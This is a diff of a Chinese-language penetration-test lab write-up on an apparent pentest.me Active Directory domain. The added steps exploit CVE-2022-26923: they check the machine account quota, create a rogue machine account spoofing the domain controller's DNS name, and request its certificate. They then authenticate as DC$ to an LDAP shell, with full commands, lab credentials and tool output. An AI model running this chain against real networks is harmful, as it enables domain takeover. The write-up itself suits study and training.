@@ -678,19 +678,7 @@ IOXIDRES... 172.24.7.3      445    DC               Address: 172.25.12.9
 
 
 必须使用 PROXYCHAINS_CONF_FILE 环境变量指定 proxychains4-24.conf（对应 6001 端口，通往 172.24.7.0/24）。
-```bash
-☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q certipy-ad account create -u usera@pentest.me -p 'Admin3gv83' -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me'
-Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
-[*] Creating new account:
-    sAMAccountName                      : EVILCOMPUTER1$
-    unicodePwd                          : 123@#ABC
-    userAccountControl                  : 4096
-    servicePrincipalName                : HOST/EVILCOMPUTER1
-                                          RestrictedKrbHost/EVILCOMPUTER1
-    dnsHostName                         : DC.pentest.me
-[*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
-```
 
 ## 查询 pentest.me 域中所有 DNS 记录，分析域内网络环境：
 
@@ -717,4 +705,119 @@ ldapsearch -x -H ldap://172.24.7.3 \
   -D "usera@pentest.me" -w "Admin3gv83" \
   -b "DC=pentest.me,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pentest,DC=me" "(objectClass=dnsNode)" \
   name dnsRecord
+```
+
+查看域 MAQ 属性，使用域用户 `usera@pentest.me` 打 `CVE-2022-26923` 漏洞：
+```
+☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q nxc --dns-server 172.24.7.3 ldap 172.24.7.3 -u usera -p Admin3gv83 -d pentest.me -M maq
+LDAP        172.24.7.3      389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:pentest.me)
+LDAP        172.24.7.3      389    DC               [+] pentest.me\usera:Admin3gv83 
+MAQ         172.24.7.3      389    DC               [*] Getting the MachineAccountQuota
+MAQ         172.24.7.3      389    DC               MachineAccountQuota: 10
+```
+
+使用 certipy 创建一个机器账户，并将该机器账户 dNSHostName 属性指向域控：
+```bash
+☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -q certipy-ad account create -u usera@pentest.me -p 'Admin3gv83' -dc-ip 172.24.7.3 -user 'EVILCOMPUTER1$' -pass '123@#ABC' -dns 'DC.pentest.me'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Creating new account:
+    sAMAccountName                      : EVILCOMPUTER1$
+    unicodePwd                          : 123@#ABC
+    userAccountControl                  : 4096
+    servicePrincipalName                : HOST/EVILCOMPUTER1
+                                          RestrictedKrbHost/EVILCOMPUTER1
+    dnsHostName                         : DC.pentest.me
+[*] Successfully created account 'EVILCOMPUTER1$' with password '123@#ABC'
+```
+
+使用该机器账户向 AD CS 服务器请求域控的证书：
+```bash
+☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad req \
+  -u 'EVILCOMPUTER1$@pentest.me' \
+  -p '123@#ABC' \
+  -dc-ip 172.24.7.3 \
+  -ca 'pentest-DC-CA' \
+  -template Machine \
+  -target-ip 172.24.7.3 \
+  -ns 172.24.7.3 \
+  -dns-tcp \
+  -debug
+[proxychains] config file found: /etc/proxychains4-24.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '172.24.7.3'
+[+] DC IP: '172.24.7.3'
+[+] DC Host: 'PENTEST.ME'
+[+] Target IP: '172.24.7.3'
+[+] Remote Name: '172.24.7.3'
+[+] Domain: 'PENTEST.ME'
+[+] Username: 'EVILCOMPUTER1$'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
+[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:445  ...  OK
+[+] Connected to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
+[*] Request ID is 6
+[*] Successfully requested certificate
+[*] Got certificate with DNS Host Name 'DC.pentest.me'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'dc.pfx'
+[+] Attempting to write data to 'dc.pfx'
+[+] Data written to 'dc.pfx'
+[*] Wrote certificate and private key to 'dc.pfx'
+```
+
+#### 关键参数解释（Certipy 5.0.4 版本）
+
+|参数|作用|为什么必须加|
+|---|---|---|
+|`-target-ip 172.24.7.3`|强制所有 RPC/LDAP/HTTP 请求直接发往这个 IP|替代了`-no-dns`的核心功能，让 Certipy 不解析 CA 服务器的域名，直接连接 IP|
+|`-ns 172.24.7.3`|指定 DNS 服务器为域控制器|确保即使有 DNS 查询，也会发往正确的内网 DNS 服务器|
+|`-dns-tcp`|强制使用 TCP 协议进行 DNS 查询|proxychains4 只能代理 TCP 流量，不能代理 UDP 的 DNS 请求|
+|`-f`|强制 proxychains 使用 fork 模式|提高对 Python 应用的兼容性，避免某些网络调用绕过代理|
+- **Certipy 在 4.0 版本后正式改名为 `certipy-ad`**，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
+- **`-no-dns` 参数在 Certipy 5.0.4 版本中被移除了**，但我们仍然可以通过其他参数实现完全相同的效果。
+
+用申请到的域控的证书，向 KDC 请求域控的 TGT 并获取哈希：
+```
+☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad auth \
+  -pfx dc.pfx \
+  -user 'dc$' \
+  -domain pentest.me \
+  -dc-ip 172.24.7.3 \
+  -ns 172.24.7.3 \
+  -dns-tcp \
+  -ldap-shell \
+  -print \
+  -debug
+[proxychains] config file found: /etc/proxychains4-24.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '172.24.7.3'
+[+] DC IP: '172.24.7.3'
+[+] DC Host: ''
+[+] Target IP: '172.24.7.3'
+[+] Remote Name: '172.24.7.3'
+[+] Domain: ''
+[+] Username: 'DC$'
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC.pentest.me'
+[+] Authenticating to LDAP server using Schannel authentication
+[*] Connecting to 'ldaps://172.24.7.3:636'
+[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:636  ...  OK
+[*] Authenticated to '172.24.7.3' as: 'u:PENTEST\\DC$'
+[+] Bound to ldaps://172.24.7.3:636 - ssl
+[+] Default path: DC=pentest,DC=me
+[+] Configuration path: CN=Configuration,DC=pentest,DC=me
+Type help for list of commands
+
+# 
 ```
